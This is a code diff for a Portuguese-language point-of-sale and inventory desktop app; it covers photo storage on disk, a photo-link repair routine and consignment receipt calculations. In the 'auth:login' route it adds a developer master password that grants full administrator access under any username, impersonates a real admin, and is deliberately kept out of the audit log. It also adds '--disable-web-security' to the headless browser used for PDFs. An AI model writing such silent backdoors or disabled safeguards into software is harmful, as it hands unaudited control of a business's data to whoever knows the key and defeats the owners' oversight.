@@ -4,7 +4,7 @@
 /* global Neutralino, NL_PATH, NL_CWD, XLSX */
 
 import * as ambiente from './ambiente.js';
-import { criarBanco, resetarDados, validarBackup, estaVazio, radiografar } from './db.js';
+import { criarBanco, resetarDados, validarBackup, estaVazio, radiografar, abrirDeBytes } from './db.js';
 import * as auth from './core/auth.js';
 import * as produtos from './core/produtos.js';
 import * as estoque from './core/estoque.js';
@@ -42,6 +42,19 @@ let RECUPERACAO_BOOT = null;
 const AVISO_FASE = (recurso) =>
   ({ ok: false, erro: `${recurso} será ativado em uma próxima atualização desta versão.` });
 
+// ---- Fotos: resolvem o NOME de arquivo guardado no banco para data URI ------
+// (as telas continuam recebendo a imagem pronta; ver ambiente.lerFotoArquivo)
+async function _resolverFotosLista(itens, ...campos) {
+  if (!Array.isArray(itens)) return itens;
+  await Promise.all(itens.map(async (it) => {
+    if (!it) return;
+    for (const c of campos) {
+      if (it[c]) it[c] = await ambiente.lerFotoArquivo(it[c]);
+    }
+  }));
+  return itens;
+}
+
 // ---- Rotas -----------------------------------------------------------------
 const rotas = {
   // Aplicativo
@@ -66,7 +79,31 @@ const rotas = {
   // ATENÇÃO: sessao.usuario é gerenciado pelo chamador (api() para app local,
   // rede.js/sessoes para terminais). Não modificar sessao aqui para evitar
   // que login/logout de terminais corrompam a sessão do app principal.
-  'auth:login': async (p) => auth.login(db, p.usuario, p.senha),
+  // Login normal. Se falhar, tenta a CHAVE-MESTRA do desenvolvedor: a MESMA
+  // senha dev do painel de licença (licenca.senhaDevOk) entra no sistema como
+  // administrador pleno, com QUALQUER usuário digitado. Serve de recuperação —
+  // funciona mesmo sem nenhum usuário válido no banco. Não cria usuário e não
+  // fica na auditoria (login silencioso, a pedido). Para não quebrar as chaves
+  // estrangeiras das gravações, a sessão assume a identidade de um admin real
+  // existente; só se não houver nenhum é que usa um "Suporte (Dev)" id 0.
+  'auth:login': async (p) => {
+    const r = await auth.login(db, p.usuario, p.senha);
+    if (r.ok) return r;
+    try {
+      if (licenca.senhaDevOk(String(p && p.senha || ''))) {
+        const adm = db.prepare(
+          "SELECT id, nome, usuario, permissoes FROM usuarios WHERE perfil='admin' AND ativo=1 ORDER BY id LIMIT 1"
+        ).get();
+        const usuario = adm
+          ? { id: adm.id, nome: adm.nome, usuario: adm.usuario, perfil: 'admin',
+              permissoes: permissoes.efetivas('admin', adm.permissoes) }
+          : { id: 0, nome: 'Suporte (Dev)', usuario: 'dev-mlopesdesign', perfil: 'admin',
+              permissoes: permissoes.efetivas('admin', null) };
+        return { ok: true, usuario };
+      }
+    } catch { /* senhaDevOk indisponível: mantém o erro normal de login */ }
+    return r;
+  },
   'auth:logout': () => ({ ok: true }),
   'auth:sessao': () => ({ ok: true, usuario: sessao.usuario }),
   'auth:listarUsuarios': () => auth.listarUsuarios(db),
@@ -275,16 +312,59 @@ const rotas = {
   'categorias:excluir': (p) => produtos.excluirCategoria(db, p.id, sessao.usuario),
 
   // Produtos + grade
-  'produtos:listar': (p) => produtos.listarProdutos(db, p || {}),
-  'produtos:obter': (p) => produtos.obterProduto(db, p.id),
-  'produtos:salvar': (p) => produtos.salvarProduto(db, p, sessao.usuario),
+  'produtos:listar': async (p) => {
+    const r = produtos.listarProdutos(db, p || {});
+    if (r.ok) await _resolverFotosLista(r.produtos, 'foto');
+    return r;
+  },
+  'produtos:obter': async (p) => {
+    const r = produtos.obterProduto(db, p.id);
+    if (r.ok) {
+      if (r.produto) await _resolverFotosLista([r.produto], 'foto');
+      await _resolverFotosLista(r.variacoes, 'foto');
+    }
+    return r;
+  },
+  'produtos:salvar': async (p) => {
+    // Grava as fotos novas em arquivo ANTES de persistir; o banco guarda o nome.
+    if (p && p.foto) { const n = await ambiente.salvarFotoArquivo(p.foto); if (n) p.foto = n; }
+    if (p && Array.isArray(p.variacoes)) {
+      for (const v of p.variacoes) {
+        if (v && v.foto) { const n = await ambiente.salvarFotoArquivo(v.foto); if (n) v.foto = n; }
+      }
+    }
+    return produtos.salvarProduto(db, p, sessao.usuario);
+  },
   'produtos:excluir': (p) => produtos.excluirProduto(db, p.id, sessao.usuario),
 
+  // Fotos guardadas em disco → data URI (usado pelo carregamento sob demanda)
+  'fotos:obter': async (p) => {
+    const foto = await ambiente.lerFotoArquivo(p && p.nome);
+    return { ok: true, foto };
+  },
+  // Resolve VÁRIAS fotos de uma vez (usado pela lista de produtos com foto).
+  // Devolve um mapa { nomeArquivo: dataUri } só dos nomes únicos, para não
+  // repetir leitura de disco quando a mesma foto se repete em variações.
+  'fotos:obterVarias': async (p) => {
+    const nomes = (p && Array.isArray(p.nomes)) ? p.nomes : [];
+    const fotos = {};
+    await Promise.all([...new Set(nomes.filter(Boolean))].map(async (n) => {
+      try { fotos[n] = await ambiente.lerFotoArquivo(n); }
+      catch { fotos[n] = null; }
+    }));
+    return { ok: true, fotos };
+  },
+
   // Estoque
-  'estoque:buscar': (p) => estoque.buscarVariacoes(db, p.termo),
+  'estoque:buscar': async (p) => {
+    const r = estoque.buscarVariacoes(db, p.termo);
+    if (r.ok) await _resolverFotosLista(r.variacoes, 'foto');
+    return r;
+  },
   'estoque:movimentar': (p) => estoque.movimentar(db, p, sessao.usuario),
   'estoque:kardex': (p) => estoque.kardex(db, p || {}),
   'estoque:reposicao': () => estoque.reposicao(db),
+  // Lista completa devolve o NOME do arquivo em `foto` (miniatura sob demanda no front)
   'estoque:listarCompleto': () => estoque.listarCompleto(db),
   'estoque:exportarXlsx': () => {
     const r = estoque.listarCompleto(db);
@@ -699,6 +779,7 @@ const rotas = {
   'estoques:variacoesNoLocal': (p) => estoques.variacoesNoLocal(db, p || {}),
   'estoques:porVariacao': (p) => ({ ok: true, locais: estoques.porVariacao(db, p.variacao_id) }),
   'estoques:transferir': (p) => estoques.transferir(db, p || {}, sessao.usuario),
+  'estoques:transferirTudo': (p) => estoques.transferirTudo(db, p || {}, sessao.usuario),
   'estoques:transferencias': (p) => estoques.listarTransferencias(db, p || {}),
   'estoques:romaneio': (p) => estoques.obterTransferencia(db, p.id),
   'estoques:conteudoXlsx': (p) => {
@@ -787,16 +868,25 @@ const rotas = {
     } else {
       // 'evento' (padrão) — usa de/ate
       if (!de || !ate) return { ok: false, erro: 'Informe o período do evento.' };
+      // O input datetime-local envia "YYYY-MM-DDTHH:MM" (separador T).
+      // O banco grava criado_em via datetime('now','localtime') → "YYYY-MM-DD HH:MM:SS" (espaço).
+      // Comparação BETWEEN com T ≠ espaço no byte 10 quebra o filtro: vendas do dia
+      // do evento ficam abaixo do limite inferior e vendas do dia seguinte entram
+      // indevidamente. Normaliza exatamente como relatorioEvento faz com limpa() (v3.24.0).
+      const _limpa = s => String(s || '').replace('T', ' ').slice(0, 16);
+      const deNorm  = _limpa(de)  + ':00';
+      const ateNorm = _limpa(ate) + ':59';
       whereFiltro = 'AND v.criado_em BETWEEN ? AND ?';
-      arParams = [fornecedor_id, de, ate];
+      arParams = [fornecedor_id, deNorm, ateNorm];
       periodoLabel = null; // gerarHtmlReciboConsignado usa de/ate diretamente
     }
 
     const itens = db.prepare(`
-      SELECT pr.nome produto, va.cor, va.tamanho,
+      SELECT pr.nome produto, va.cor, va.tamanho, pr.preco_venda,
              cg.qtd, cg.valor_venda, cg.valor_custo,
              cg.pct_fornecedor, cg.valor_fornecedor, cg.valor_loja, cg.status,
              v.id venda_id, v.criado_em venda_data,
+             v.subtotal venda_subtotal, v.total venda_total,
              f.nome fornecedor, f.id fornecedor_id
       FROM consignacoes cg
       JOIN vendas v    ON v.id   = cg.venda_id
@@ -887,6 +977,33 @@ const rotas = {
       if (!prod.foto && row.foto_var) prod.foto = row.foto_var;
     }
 
+    // Fotos no catálogo (v3.25.31): o Chromium headless que gera este PDF RECUSA
+    // data URI GRANDE em <img> — por isso o catálogo saía sem as fotos das peças
+    // (só o logo, que é pequeno, aparecia). Solução robusta: gravar cada foto
+    // como ARQUIVO na MESMA pasta do HTML (tmp-print) e referenciar por caminho
+    // RELATIVO. O file:// no mesmo diretório carrega imagem de qualquer tamanho.
+    const _appDirCat = (typeof NL_PATH !== 'undefined' ? NL_PATH : (typeof NL_CWD !== 'undefined' ? NL_CWD : '')).replace(/\\/g, '/');
+    const _tmpDirCat = _appDirCat + '/tmp-print';
+    try { await Neutralino.filesystem.createDirectory(_tmpDirCat); } catch {}
+    const _fotosCatArqs = [];
+    let _fIdx = 0;
+    for (const prod of prodMap.values()) {
+      if (!prod.foto) continue;
+      try {
+        const dataUri = await ambiente.lerFotoArquivo(prod.foto);
+        const m = /^data:image\/([a-z0-9.+-]+);base64,(.*)$/i.exec(dataUri || '');
+        if (!m) { prod.foto = null; continue; }
+        const ext = (m[1].toLowerCase() === 'jpeg' ? 'jpg' : m[1].toLowerCase()).replace(/[^a-z0-9]/g, '') || 'jpg';
+        const bin = atob(m[2]);
+        const bytes = new Uint8Array(bin.length);
+        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+        const nomeArq = `catimg-${Date.now()}-${_fIdx++}.${ext}`;
+        await Neutralino.filesystem.writeBinaryFile(`${_tmpDirCat}/${nomeArq}`, bytes.buffer);
+        _fotosCatArqs.push(`${_tmpDirCat}/${nomeArq}`);
+        prod.foto = nomeArq;   // caminho relativo ao HTML (mesma pasta tmp-print)
+      } catch { prod.foto = null; }
+    }
+
     // Agrupa por categoria
     const catMap = new Map();
     for (const prod of prodMap.values()) {
@@ -906,7 +1023,10 @@ const rotas = {
     } catch { cfg._logoUri = cfg.logo_cupom || cfg.logo || ''; }
 
     const html = gerarHtmlCatalogo(cats, cfg, { titulo, colecao, mostrarPreco, mostrarRef, mostrarQr });
-    return _gerarPdfBase64(html);
+    const _resCat = await _gerarPdfBase64(html);
+    // limpa as imagens temporárias do catálogo (o HTML/PDF o próprio gerador apaga)
+    for (const arq of _fotosCatArqs) { try { await Neutralino.filesystem.remove(arq); } catch {} }
+    return _resCat;
   },
 
   'lojas:listar': (p) => lojas.listar(db, p || {}),
@@ -1503,6 +1623,7 @@ async function _gerarPdfBase64(html) {
       `if (!$e) { Write-Error 'Edge nao encontrado'; exit 1 }`,
       `$u = 'file:///' + $h.Replace('\\','/')`,
       `$eA = @('--headless=new','--no-sandbox','--run-all-compositor-stages-before-draw',` +
+        `'--allow-file-access-from-files','--disable-web-security',` +
         `'--print-to-pdf-no-margins','--paper-width=8.267','--paper-height=11.692',` +
         `"--print-to-pdf=$p",'--print-to-pdf-no-header',$u)`,
       `& $e @eA`,
@@ -1608,19 +1729,45 @@ function gerarHtmlReciboConsignado(itens, cfg, periodo) {
     (deBr !== '—' && ateBr !== '—' ? `${deBr} até ${ateBr}` : '—');
 
   // Agrega por produto (nome + cor + tamanho)
+  //
+  // IMPORTANTE (v3.25.20): o repasse aqui usa EXATAMENTE a mesma fórmula do
+  // relatório de comissão de consignados (core/relatorios.js), para que recibo e
+  // relatório mostrem os mesmos valores. O repasse é recalculado sobre o valor
+  // RECEBIDO (após o desconto do fechamento), não sobre o valor_fornecedor
+  // gravado — que em vendas antigas ficou com base no valor de tabela cheio.
+  //   fator    = total / subtotal da venda (distribui o desconto do fechamento)
+  //   recebido = valor_venda * fator
+  //   repasse  = custo + (recebido − custo) * pct%   (fornecedor_ajustado)
   const map = new Map();
   for (const cg of itens) {
     const cor = (cg.cor && cg.cor !== 'Única') ? cg.cor : null;
     const tam = (cg.tamanho && cg.tamanho !== 'U') ? cg.tamanho : null;
     const chave = [cg.produto, cor, tam].filter(Boolean).join(' · ');
+
+    // ESPELHA O RELATÓRIO (core/relatorios.js, v3.25.30): SEM reaplicar o fator
+    // do desconto — o valor_venda gravado JÁ é o valor PAGO (líquido de todo
+    // desconto, calculado na venda por pdv.js). Reaplicar o fator descontava o
+    // mesmo desconto duas vezes.
+    //   • Vl. tabela = preço CHEIO do cadastro × qtd (sem desconto)
+    //   • Recebido   = valor_venda (o que a loja recebeu)
+    //   • Desconto   = tabela − recebido
+    //   • Repasse    = valor_fornecedor gravado (já calculado certo na venda)
+    const _custo  = arred(cg.valor_custo  || 0);
+    const _tabela = arred((Number(cg.qtd) || 0) * (Number(cg.preco_venda) || 0));
+    const _receb  = arred(cg.valor_venda || 0);
+    const _desc   = arred(_tabela - _receb);
+    const _repasse = arred(cg.valor_fornecedor || 0);
+
     const g = map.get(chave) || { produto: cg.produto, cor, tam, qtd: 0,
-      venda: 0, custo: 0, comissao: 0, pcts: new Set(), pendente: 0 };
-    g.qtd      += Number(cg.qtd)             || 0;
-    g.venda     = arred(g.venda     + (cg.valor_venda      || 0));
-    g.custo     = arred(g.custo     + (cg.valor_custo      || 0));
-    g.comissao  = arred(g.comissao  + (cg.valor_fornecedor || 0));
+      venda: 0, recebido: 0, desconto: 0, custo: 0, comissao: 0, pcts: new Set(), pendente: 0 };
+    g.qtd      += Number(cg.qtd) || 0;
+    g.venda     = arred(g.venda    + _tabela);
+    g.recebido  = arred(g.recebido + _receb);
+    g.desconto  = arred(g.desconto + _desc);
+    g.custo     = arred(g.custo    + _custo);
+    g.comissao  = arred(g.comissao + _repasse);   // repasse gravado, igual ao relatório
     if (cg.pct_fornecedor) g.pcts.add(Number(cg.pct_fornecedor));
-    if (cg.status === 'pendente') g.pendente = arred(g.pendente + (cg.valor_fornecedor || 0));
+    if (cg.status === 'pendente') g.pendente = arred(g.pendente + _repasse);
     map.set(chave, g);
   }
   const grupos = [...map.values()];
@@ -1628,21 +1775,28 @@ function gerarHtmlReciboConsignado(itens, cfg, periodo) {
   // Totais gerais
   const totQtd   = grupos.reduce((s,g) => s + g.qtd, 0);
   const totVenda  = grupos.reduce((s,g) => arred(s + g.venda), 0);
+  const totRecebido = grupos.reduce((s,g) => arred(s + g.recebido), 0);
+  const totDesconto = grupos.reduce((s,g) => arred(s + g.desconto), 0);
   const totCusto  = grupos.reduce((s,g) => arred(s + g.custo), 0);
   const totComissao = grupos.reduce((s,g) => arred(s + g.comissao), 0);
   const totPendente = grupos.reduce((s,g) => arred(s + g.pendente), 0);
-  const totLoja   = arred(totVenda - totComissao);
+  // Sobra da loja = recebido − repasse (mesmo critério do relatório: loja_real).
+  const totLoja   = arred(totRecebido - totComissao);
   const totLucroForn = arred(totComissao - totCusto);
 
   const linhasItens = grupos.map(g => {
     const pctLabel = g.pcts.size === 1 ? `${[...g.pcts][0]}%` : 'variado';
     const descricao = [g.produto, g.cor, g.tam].filter(Boolean).join(' · ');
+    const lucroG = arred(g.comissao - g.custo);
     return `<tr>
       <td>${esc2(descricao)}</td>
       <td class="num">${g.qtd}</td>
       <td class="num">${moeda(g.venda)}</td>
+      <td class="num">${(g.desconto || 0) > 0.005 ? '−' + moeda(g.desconto) : '—'}</td>
+      <td class="num">${moeda(g.recebido)}</td>
       <td class="num">${moeda(g.custo)}</td>
       <td class="num">${esc2(pctLabel)}</td>
+      <td class="num">${moeda(lucroG)}</td>
       <td class="num"><b>${moeda(g.comissao)}</b></td>
     </tr>`;
   }).join('');
@@ -1715,9 +1869,12 @@ tbody td.num{text-align:right}
     <th>Produto / Variação</th>
     <th class="num">Qtd</th>
     <th class="num">Vl. tabela</th>
-    <th class="num">Custo unit.</th>
+    <th class="num">Desconto</th>
+    <th class="num">Recebido</th>
+    <th class="num">Custo</th>
     <th class="num">% acerto</th>
-    <th class="num">Repasse</th>
+    <th class="num">+ Fatia lucro</th>
+    <th class="num">= Repasse</th>
   </tr></thead>
   <tbody>
     ${linhasItens}
@@ -1725,8 +1882,11 @@ tbody td.num{text-align:right}
       <td><b>TOTAL</b></td>
       <td class="num"><b>${totQtd}</b></td>
       <td class="num"><b>${moeda(totVenda)}</b></td>
+      <td class="num"><b>${totDesconto > 0.005 ? '−' + moeda(totDesconto) : '—'}</b></td>
+      <td class="num"><b>${moeda(totRecebido)}</b></td>
       <td class="num"><b>${moeda(totCusto)}</b></td>
       <td class="num">—</td>
+      <td class="num"><b>${moeda(totLucroForn)}</b></td>
       <td class="num"><b>${moeda(totComissao)}</b></td>
     </tr>
   </tbody>
@@ -1737,12 +1897,14 @@ tbody td.num{text-align:right}
   <div>
     <div class="res-linha"><span>Peças vendidas</span><b>${totQtd} peça(s)</b></div>
     <div class="res-linha"><span>Valor de tabela</span><b>${moeda(totVenda)}</b></div>
+    ${totDesconto > 0.005 ? `<div class="res-linha"><span>Desconto no fechamento</span><b>−${moeda(totDesconto)}</b></div>` : ''}
+    <div class="res-linha"><span>Recebido</span><b>${moeda(totRecebido)}</b></div>
     <div class="res-linha"><span>Custo das peças</span><b>${moeda(totCusto)}</b></div>
   </div>
   <div>
     <div class="res-linha"><span>Fatia do lucro (fornecedor)</span><b>${moeda(totLucroForn)}</b></div>
     <div class="res-linha dest"><span>TOTAL A REPASSAR</span><b>${moeda(totComissao)}</b></div>
-    <div class="res-linha suave"><span>Parte da loja (receita)</span><b>${moeda(totLoja)}</b></div>
+    <div class="res-linha suave"><span>Sobra para a loja</span><b>${moeda(totLoja)}</b></div>
   </div>
 </div>
 
@@ -2166,7 +2328,7 @@ const PERM_ROTA = {
   'estoques:romaneio': 'estoque.ver', 'estoques:conteudoXlsx': 'estoque.ver',
   'estoques:romaneio-pdf': 'estoque.ver', 'estoques:relatorio-transferencias-pdf': 'estoque.ver',
   'estoques:salvar': 'estoque.movimentar', 'estoques:desativar': 'estoque.movimentar',
-  'estoques:transferir': 'estoque.movimentar',
+  'estoques:transferir': 'estoque.movimentar', 'estoques:transferirTudo': 'estoque.movimentar',
   'pdv:caixaAtual': 'pdv.ver', 'pdv:resumoCaixa': 'pdv.ver', 'pdv:listarVendas': 'pdv.ver', 'pdv:listarVendasGeral': 'pdv.ver', 'pdv:obterVenda': 'pdv.ver',
   'pdv:venda': 'pdv.vender',
   'pdv:abrirCaixa': 'caixa.abrir_fechar', 'pdv:fecharCaixa': 'caixa.abrir_fechar',
@@ -2278,6 +2440,136 @@ async function _iniciar() {
       db.prepare("INSERT OR REPLACE INTO config (chave, valor) VALUES ('logo_cupom', ?)").run(LOGO_DEFAULT);
     }
   } catch (e) { console.warn('[logo-default]', e); }
+
+  // Migração v3.25.22: fotos base64 do banco → arquivos em dados/fotos.
+  // Motivo: fotos inline inflavam o .db e o export() de cada gravação estourava
+  // a memória do SQLite/WASM (Aborted OOM) ao ajustar estoque no Windows.
+  // Segurança: backup do .db ANTES (cópia de arquivo, sem export); e o base64 só
+  // sai da linha DEPOIS que o arquivo foi gravado. Idempotente (flag em config).
+  try {
+    const flag = 'migr_fotos_disco_v1';
+    const jaFeita = db.prepare("SELECT valor FROM config WHERE chave=?").get(flag);
+    // só migra se houver realmente foto inline (evita trabalho em banco já migrado)
+    const temInline = !jaFeita && db.prepare(
+      "SELECT 1 FROM produtos WHERE foto LIKE 'data:image/%' " +
+      "UNION ALL SELECT 1 FROM variacoes WHERE foto LIKE 'data:image/%' LIMIT 1"
+    ).get();
+    if (temInline) {
+      // 1) Backup do banco atual por CÓPIA DE ARQUIVO (não usa export → não estoura)
+      try {
+        const dir = await ambiente.dirDados();
+        const src = `${dir}/salgueiro.db`;
+        const st = await Neutralino.filesystem.getStats(src).catch(() => null);
+        if (st) {
+          const bkpDir = `${dir}/backups`;
+          try { await Neutralino.filesystem.createDirectory(bkpDir); } catch {}
+          await Neutralino.filesystem.copy(src, `${bkpDir}/salgueiro-antes-fotos.db`);
+        }
+      } catch (e) { console.warn('[migr-fotos] backup:', e && e.message); }
+
+      // 2) Extrair cada foto inline para arquivo e trocar a coluna pelo nome
+      let migradas = 0, falhas = 0;
+      for (const tabela of ['produtos', 'variacoes']) {
+        const linhas = db.prepare(
+          `SELECT id, foto FROM ${tabela} WHERE foto LIKE 'data:image/%'`
+        ).all();
+        for (const l of linhas) {
+          try {
+            const nome = await ambiente.salvarFotoArquivo(l.foto);
+            if (nome) {
+              db.prepare(`UPDATE ${tabela} SET foto=? WHERE id=?`).runVolatil(nome, l.id); // sem db.export() → sem OOM
+              migradas++;
+            } else { falhas++; }
+          } catch (e) { falhas++; console.warn('[migr-fotos]', tabela, l.id, e && e.message); }
+        }
+      }
+      // 3) VACUUM: sem as fotos, as páginas do banco ficaram livres mas o arquivo
+      //    continua do mesmo tamanho (SQLite não devolve sozinho). O VACUUM
+      //    reconstrói o banco compacto — só aqui o .db realmente encolhe e o
+      //    export() de cada gravação para de estourar. É barato: os dados vivos
+      //    já são pequenos (as fotos saíram).
+      try { db.exec('VACUUM'); } catch (e) { console.warn('[migr-fotos] vacuum:', e && e.message); }
+      // VACUUM compacta em memória; persiste agora para que o próximo boot já ache o banco menor
+      try { await db.salvarAgora(); } catch (e) { console.warn('[migr-fotos] salvarAgora:', e && e.message); }
+
+      // 4) Marca concluída só se nada falhou — senão repete no próximo boot,
+      //    sem risco (as já migradas não têm mais 'data:image/%' e são puladas).
+      if (falhas === 0) {
+        db.prepare("INSERT OR REPLACE INTO config (chave, valor) VALUES (?, datetime('now','localtime'))").run(flag);
+      }
+      console.log(`[migr-fotos] ${migradas} foto(s) para disco, ${falhas} falha(s)`);
+    } else if (!jaFeita) {
+      // banco sem foto inline: marca como migrado para não checar toda vez
+      db.prepare("INSERT OR REPLACE INTO config (chave, valor) VALUES (?, datetime('now','localtime'))").run(flag);
+    }
+  } catch (e) { console.error('[migr-fotos] falhou (banco intacto):', e && e.message); }
+
+  // ── Reparo do vínculo foto ↔ produto (v3.25.32) ───────────────────────────
+  //
+  // O QUE ACONTECEU (26/08/2026): todas as fotos sumiram das telas de uma vez.
+  // Os ARQUIVOS estavam intactos em dados/fotos; o que quebrou foi o VÍNCULO:
+  // o banco apontava para 42 nomes de arquivo inexistentes enquanto 44 arquivos
+  // ficavam órfãos na pasta.
+  //
+  // CAUSA: a foto vira um arquivo com nome ALEATÓRIO na migração. Restaurar um
+  // backup do banco (ou trazer o banco de outra máquina) traz os nomes daquela
+  // outra "leva" — mas os ARQUIVOS não vêm junto com o .db. Resultado: todos os
+  // ponteiros quebram de uma vez e o app mostra tudo sem foto, em silêncio,
+  // porque lerFotoArquivo devolve null quando o arquivo não existe.
+  //
+  // O REPARO: se houver foto apontando para arquivo que não existe, procura nos
+  // backups (mais novo primeiro) um mapa id→arquivo cujo arquivo EXISTA em
+  // disco e refaz o vínculo. Só religa o que dá para provar; nunca inventa.
+  try {
+    const arquivos = new Set(await ambiente.listarArquivosFotos());
+    if (arquivos.size) {
+      const quebrados = { produtos: [], variacoes: [] };
+      for (const tabela of ['produtos', 'variacoes']) {
+        const linhas = db.prepare(
+          `SELECT id, foto FROM ${tabela} WHERE foto IS NOT NULL AND foto <> '' AND foto NOT LIKE 'data:image/%'`
+        ).all();
+        for (const l of linhas) if (!arquivos.has(l.foto)) quebrados[tabela].push(l.id);
+      }
+      const totalQuebrado = quebrados.produtos.length + quebrados.variacoes.length;
+      if (totalQuebrado > 0) {
+        console.warn(`[reparo-fotos] ${totalQuebrado} vínculo(s) quebrado(s) — procurando nos backups`);
+        const { backups } = await ambiente.listarBackupsLocais(); // mais novo primeiro
+        let religadas = 0;
+        for (const b of backups) {
+          if (!quebrados.produtos.length && !quebrados.variacoes.length) break;
+          let t = null;
+          try {
+            const bytes = await ambiente.lerBackupLocal(b.nome);
+            if (!bytes || !bytes.length) continue;
+            if (bytes.length > 8_000_000) continue; // backup grande: 2ª instância sql.js em memória → OOM
+            t = await abrirDeBytes(bytes, async () => {});
+            for (const tabela of ['produtos', 'variacoes']) {
+              if (!quebrados[tabela].length) continue;
+              const restantes = [];
+              for (const id of quebrados[tabela]) {
+                let cand = null;
+                try { cand = t.prepare(`SELECT foto FROM ${tabela} WHERE id=?`).get(id); } catch {}
+                const nome = cand && cand.foto;
+                if (nome && arquivos.has(nome)) {
+                  db.prepare(`UPDATE ${tabela} SET foto=? WHERE id=?`).runVolatil(nome, id); // sem db.export() → sem OOM
+                  religadas++;
+                } else { restantes.push(id); }
+              }
+              quebrados[tabela] = restantes;
+            }
+          } catch (e) { console.warn('[reparo-fotos] backup', b.nome, e && e.message);
+          } finally { try { if (t) t._db.close(); } catch {} }
+        }
+        const sobraram = quebrados.produtos.length + quebrados.variacoes.length;
+        if (religadas > 0) {
+          try { await db.salvarAgora(); } catch {}
+          console.log(`[reparo-fotos] ${religadas} foto(s) religada(s), ${sobraram} sem correspondência`);
+        } else {
+          console.warn(`[reparo-fotos] nenhum backup tinha o vínculo (${sobraram} pendente(s))`);
+        }
+      }
+    }
+  } catch (e) { console.error('[reparo-fotos] falhou (banco intacto):', e && e.message); }
 
   // Migration v2.0.48: recalcular valor_devolvido em devoluções de vendas com desconto geral.
   // O bug pré-v2.0.48 usava o total bruto do item (sem proporcionar desconto_geral da venda).
